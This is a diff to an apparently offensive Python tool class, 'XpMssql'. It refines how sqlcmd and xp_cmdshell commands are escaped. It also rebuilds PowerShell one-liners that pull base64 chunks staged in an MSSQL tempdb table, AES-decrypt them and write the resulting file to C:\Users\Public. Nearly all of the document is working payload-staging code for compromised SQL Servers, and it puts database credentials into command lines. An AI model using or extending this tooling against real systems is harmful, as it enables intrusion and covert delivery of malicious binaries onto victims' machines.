@@ -99,15 +99,15 @@ class XpMssql:
         return f"C:\\Users\\Public\\{stem}.{ext}"
 
     def _tsql_escape(self, s: str) -> str:
-        """Escape for T-SQL string literal and C runtime -Q "..." arg parsing."""
-        return s.replace("'", "''").replace('"', '""')
+        """Escape a value for embedding inside a T-SQL string literal '...'."""
+        return s.replace("'", "''")
 
     def _sqlcmd_prefix(self) -> str:
         return f'sqlcmd -S {self._host} -U {self._login} -P {self._password} -C'
 
     def _exec_q(self, shell, tsql: str) -> str:
-        """Send one xp_cmdshell EXEC task via -Q and return output."""
-        cmd = f'{self._sqlcmd_prefix()} -Q "{self._tsql_escape(tsql)}"'
+        """Send one sqlcmd -Q task. Escapes " for C runtime -Q "..." boundary only."""
+        cmd = f'{self._sqlcmd_prefix()} -Q "{tsql.replace(chr(34), chr(34)*2)}"'
         return shell.cmd_exec_raw(cmd)
 
     def _sp_oa_write(self, shell, path: str, content: str):
@@ -196,30 +196,35 @@ class XpMssql:
         print(f"[+] xpstage done → {out_path}")
 
     def _build_decrypt_ps(self, key_b64: str, out_path: str) -> str:
+        # Use single-quoted PS strings throughout — no " in content avoids C-runtime escaping issues
+        connstr = f'Server={self._host};Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True'
         return (
-            f'$k=[Convert]::FromBase64String("{key_b64}");'
-            f'$cn=New-Object System.Data.SqlClient.SqlConnection("Server={self._host};'
-            f'Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True");'
-            '$cn.Open();$cm=$cn.CreateCommand();$cm.CommandText="SELECT chunk FROM tempdb..stg ORDER BY id";'
-            '$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;'
-            'while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};$rd.Close();$cn.Close();'
-            '$b=[Convert]::FromBase64String($sb.ToString());'
-            '$a=[System.Security.Cryptography.Aes]::Create();'
-            '$a.Mode="CBC";$a.Padding="PKCS7";$a.Key=$k;$a.IV=$b[0..15];'
-            '$ct=$b[16..($b.Length-1)];'
-            '$dec=$a.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length);'
-            f'[IO.File]::WriteAllBytes("{out_path}",$dec)'
+            f"$k=[Convert]::FromBase64String('{key_b64}');"
+            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
+            "$cn.Open();$cm=$cn.CreateCommand();"
+            "$cm.CommandText='SELECT chunk FROM tempdb..stg ORDER BY id';"
+            "$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;"
+            "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
+            "$rd.Close();$cn.Close();"
+            "$b=[Convert]::FromBase64String($sb.ToString());"
+            "$a=[System.Security.Cryptography.Aes]::Create();"
+            "$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$b[0..15];"
+            "$ct=$b[16..($b.Length-1)];"
+            "$dec=$a.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length);"
+            f"[IO.File]::WriteAllBytes('{out_path}',$dec)"
         )
 
     def _build_plain_ps(self, out_path: str) -> str:
+        connstr = f'Server={self._host};Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True'
         return (
-            f'$cn=New-Object System.Data.SqlClient.SqlConnection("Server={self._host};'
-            f'Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True");'
-            '$cn.Open();$cm=$cn.CreateCommand();$cm.CommandText="SELECT chunk FROM tempdb..stg ORDER BY id";'
-            '$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;'
-            'while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};$rd.Close();$cn.Close();'
-            '$b=[Convert]::FromBase64String($sb.ToString());'
-            f'[IO.File]::WriteAllBytes("{out_path}",$b)'
+            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
+            "$cn.Open();$cm=$cn.CreateCommand();"
+            "$cm.CommandText='SELECT chunk FROM tempdb..stg ORDER BY id';"
+            "$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;"
+            "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
+            "$rd.Close();$cn.Close();"
+            "$b=[Convert]::FromBase64String($sb.ToString());"
+            f"[IO.File]::WriteAllBytes('{out_path}',$b)"
         )
 
 
